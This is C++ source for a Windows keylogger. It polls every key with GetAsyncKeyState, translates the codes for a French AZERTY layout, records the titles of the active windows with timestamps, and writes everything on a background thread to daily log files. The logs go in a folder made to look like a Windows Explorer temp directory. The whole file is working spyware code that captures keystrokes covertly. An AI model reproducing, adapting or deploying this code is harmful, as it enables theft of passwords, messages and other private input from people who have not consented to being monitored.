#include "stdafx.h"
#include "keylogger.h"

using namespace std;

Keylogger::Keylogger()
{
}

Keylogger::~Keylogger()
{
}

string Keylogger::getPath() {

	SYSTEMTIME st;
	GetSystemTime(&st);

	char tt[100];
	sprintf_s(tt, "%.4d-%.2d-%.2d", st.wYear, st.wMonth, st.wDay);

	string path;
	char pa[260];
	GetEnvironmentVariable("USERPROFILE", pa, 260);
	path = pa;
	path += "\\AppData\\Local\\Microsoft\\Windows\\Explorer\\temp\\";

	CreateDirectory(path.c_str(), NULL);

	path += tt;
	path += ".txt";

	return path;
}

void Keylogger::update_controle_keys() {

	Shift = AltGr = Ctrl = false;

	if ((GetKeyState(VK_LSHIFT) & 0x8000) != 0 || (GetKeyState(VK_RSHIFT) & 0x8000) != 0)
		Shift = true;
	else if ((GetKeyState(VK_RMENU) & 0x8000) != 0)  // AltGr must be before Ctrl (Ctrl activation)
		AltGr = true;
	else if ((GetKeyState(VK_LCONTROL) & 0x8000) != 0 || (GetKeyState(VK_RCONTROL) & 0x8000) != 0)
		Ctrl = true;
	else if ((GetKeyState(VK_CAPITAL) & 0x8000) != 0)
		Capital = !Capital;

	return;
}

string Keylogger::key_to_char(int key) {

	// controle keys
	if (key == VK_BACK)
		return "[BS]";
	if (key == VK_DELETE)
		return "[DEL]";
	else if (key == VK_CLEAR)
		return "[CLEAR]";
	else if (key == VK_RETURN)
		return "\n";
	else if (key == VK_SPACE)
		return " ";

	else if (key == VK_LEFT)
		return "[LEFT]";
	else if (key == VK_UP)
		return "[UP]";
	else if (key == VK_RIGHT)
		return "[RIGHT]";
	else if (key == VK_DOWN)
		return "[DOWN]";

	// Numeric line
	else if (key >= 0x30 && key <= 0x39) {
		if (Shift)
			return string(1, char(key));
		else
			if (key == 0x30)
				if (AltGr)
					return "@";
				else
					return "à";

			else if (key == 0x31)
				if (AltGr)
					return "";
				else
					return "&";

			else if (key == 0x32)
				if (AltGr)
					return "~";
				else
					return "é";

			else if (key == 0x33)
				if (AltGr)
					return "#";
				else
					return "\"";

			else if (key == 0x34)
				if (AltGr)
					return "{";
				else
					return "'";

			else if (key == 0x35)
				if (AltGr)
					return "[";
				else
					return "(";

			else if (key == 0x36)
				if (AltGr)
					return "|";
				else
					return "-";

			else if (key == 0x37)
				if (AltGr)
					return "`";
				else
					return "è";

			else if (key == 0x38)
				if (AltGr)
					return "\\";
				else
					return "_";

			else if (key == 0x39)
				if (AltGr)
					return "^";
				else
					return "ç";
	}

	// Letters 
	else if (key >= 0x41 && key <= 0x5a)
		if (Shift && !Capital || !Shift && Capital)
			return string(1, char(key)); // Upper case letters
		else
			return string(1, char(key + 32)); // Lower case  letters

											  // Numeric keypad
	else if (key == VK_NUMPAD0)
		return "0";
	else if (key == VK_NUMPAD1)
		return "1";
	else if (key == VK_NUMPAD2)
		return "2";
	else if (key == VK_NUMPAD3)
		return "3";
	else if (key == VK_NUMPAD4)
		return "4";
	else if (key == VK_NUMPAD5)
		return "5";
	else if (key == VK_NUMPAD6)
		return "6";
	else if (key == VK_NUMPAD7)
		return "7";
	else if (key == VK_NUMPAD8)
		return "8";
	else if (key == VK_NUMPAD9)
		return "9";

	else if (key == VK_MULTIPLY)
		return "*";
	else if (key == VK_ADD)
		return "+";
	else if (key == VK_DECIMAL)
		return ".";
	else if (key == VK_SUBTRACT)
		return "-";
	else if (key == VK_DIVIDE)
		return "/";


	else if (key == VK_OEM_1)
		if (Shift)
			return "£";
		else
			return "$";

	else if (key == VK_OEM_2)
		if (Shift)
			return "/";
		else
			return ":";

	else if (key == VK_OEM_3)
		if (Shift)
			return "%";
		else
			return "ù";

	else if (key == VK_OEM_4)
		if (Shift)
			return "°";
		else if (AltGr)
			return "]";
		else
			return ")";

	else if (key == VK_OEM_5)
		if (Shift)
			return "µ";
		else
			return "*";

	else if (key == VK_OEM_6)
		if (Shift)
			return "¨";
		else
			return "^";

	else if (key == VK_OEM_7)
		return "²";

	else if (key == VK_OEM_8)
		if (Shift)
			return "§";
		else
			return "!";


	else if (key == VK_OEM_COMMA)
		if (Shift)
			return "?";
		else
			return ",";

	else if (key == VK_OEM_102)
		if (Shift)
			return ">";
		else
			return "<";

	else if (key == VK_OEM_PERIOD)
		if (Shift)
			return ".";
		else
			return ";";

	else if (key == VK_OEM_PLUS)
		if (Shift)
			return "+";
		else if (AltGr)
			return "}";
		else
			return "=";

	else if (key == VK_OEM_CLEAR)
		if (Shift)
			return "?";
		else
			return "clear";

	else if (key == VK_OEM_MINUS)
		if (Shift)
			return "?";
		else
			return "minus";
	else 
		return "";
}

void Keylogger::log() {

	string path = getPath();

	while (true)
	{
		Sleep(10);

		h_for = GetForegroundWindow(); // Get active window hwnd

		if (h_org != h_for) {
			h_org = h_for; // set active window
			char name[260];
			GetWindowText(h_org, name, 260); // get window name

			tm = name; // windows name

			if (tm != "") {
				SYSTEMTIME st;
				GetSystemTime(&st); // get time
				char tt[100];
				sprintf_s(tt, "%.4d-%.2d-%.2d %.2d:%.2d:%.2d", st.wYear, st.wMonth, st.wDay, st.wHour + 1, st.wMinute, st.wSecond);

				tm += " | ";
				tm += tt; // time
				tm += "\n";
				tm = "\n\n" + tm;

				LogFile.open(path, fstream::app);
				LogFile << tm.c_str();
				LogFile.close();
			}

		}

		for (int KEY = 0; KEY <= 255; KEY++) {
			if (GetAsyncKeyState(KEY) == -32767) {

				update_controle_keys();
				ch = key_to_char(KEY);

				LogFile.open(path, fstream::app);
				LogFile << ch.c_str();
				LogFile.close();
			}
		}
	}
}

DWORD WINAPI Keylogger::startLogging(PVOID instance) {
	((Keylogger*)instance)->log();
	return 0;
}

HANDLE Keylogger::startThread() {
	return (HANDLE) CreateThread(0, 0, startLogging, this, 0, 0);
}